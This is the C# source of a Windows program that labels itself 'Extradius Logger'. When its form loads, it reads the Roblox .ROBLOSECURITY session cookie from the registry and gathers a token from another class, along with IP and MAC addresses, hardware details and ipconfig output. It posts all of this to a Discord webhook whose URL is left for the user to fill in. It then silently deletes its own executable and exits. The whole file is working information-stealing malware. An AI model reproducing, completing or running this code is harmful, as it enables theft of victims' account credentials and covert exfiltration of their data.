using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Reezy
{
    public partial class Form1 : Form
    {
        public static string content = "";


  

    public Form1()
    {
       InitializeComponent();
            TopMost = true;

            this.TransparencyKey = this.BackColor;
    }

        public static bool IsInStartupFolder()
        {
            // Get the path to the startup folder
            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

            // Get the path to the current executable
            string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;

            // Check if the current directory is the startup folder
            bool isInStartupFolder = Path.GetDirectoryName(appPath).Equals(startupFolder, StringComparison.OrdinalIgnoreCase);

            return isInStartupFolder;
        }
        public static string Token = "";
        private void Form1_Load(object sender, EventArgs e)
        {
       

            string systemInfo = GetSystemInfo();
           

            kniga.Main2();

            NetworkInterface networkInterface = NetworkInterface.GetAllNetworkInterfaces()[0];

            // Get the physical address (MAC)
            PhysicalAddress physicalAddress = networkInterface.GetPhysicalAddress();
            string command = "ipconfig"; // Replace with your command
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();

            // Convert the MAC address to a string
            byte[] bytes = physicalAddress.GetAddressBytes();
            string macAddress = string.Join(":", bytes.Select(b => b.ToString("X2")));

            string keyPath = @"HKEY_CURRENT_USER\SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com";
            string valueName = ".ROBLOSECURITY";
            string localIP = Dns.GetHostAddresses(Dns.GetHostName())
                   .FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)?
                   .ToString();

            var webhookUrl = "UR WEBHOOK HERE";
            object value = Registry.GetValue(keyPath, valueName, null);
            var client = new HttpClient();
            var payload = new
            {

                avatar_url = "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
                username = "Extradius Logger Hitted.",
                embeds = new[]
                {
                new
                {
                    title = "Extradius Logger",
                    description = "**IPv4💫:** \n"+"```" + localIP + "```" +"\n" + "**Mac💎:**"+"```" + macAddress +"```"+ "\n**PC Specs**💻:\n"+ "```"+systemInfo +"```"+"\n **Token🔑:** \n ```" + kniga.content+"```" + "\n **Roblox🟥:**"+"\n" +"```"+ value+"```\n"+"**Netstat🌐:**"+ "```"+ output + "```",
                    color = 0x5D3FD3,

                }
            }
            };

            var json = JsonConvert.SerializeObject(payload);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            var result = client.PostAsync(webhookUrl, content);
         
                string appPath2 = System.Reflection.Assembly.GetExecutingAssembly().Location;
          
                // Start a new process to delete the file when the application exits
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + appPath2 + "\"";
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(psi);
            Thread.Sleep(1000);
            Environment.Exit(0);
           
            
            // Get the path to the current executable
           
          
        }


        public static string GetSystemInfo()
        {
            string result = "";

            // Get CPU information
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Name, Manufacturer, MaxClockSpeed, NumberOfCores FROM Win32_Processor");
            foreach (ManagementObject obj in searcher.Get())
            {
                result += string.Format("CPU: {0} ({1}) - {2} cores @ {3} MHz\n", obj["Name"], obj["Manufacturer"], obj["NumberOfCores"], obj["MaxClockSpeed"]);
            }

            // Get RAM information
            searcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory");
            ulong totalMemory = 0;
            foreach (ManagementObject obj in searcher.Get())
            {
                totalMemory += Convert.ToUInt64(obj["Capacity"]);
            }
            result += string.Format("RAM: {0} GB\n", totalMemory / (1024 * 1024 * 1024));

            // Get disk information
            searcher = new ManagementObjectSearcher("SELECT Size, FreeSpace FROM Win32_LogicalDisk WHERE DeviceID = 'C:'");
            foreach (ManagementObject obj in searcher.Get())
            {
                ulong totalSpace = Convert.ToUInt64(obj["Size"]);
                ulong freeSpace = Convert.ToUInt64(obj["FreeSpace"]);
                result += string.Format("Disk: {0} GB total, {1} GB free\n", totalSpace / (1024 * 1024 * 1024), freeSpace / (1024 * 1024 * 1024));
            }

            return result;
        }


    }
}

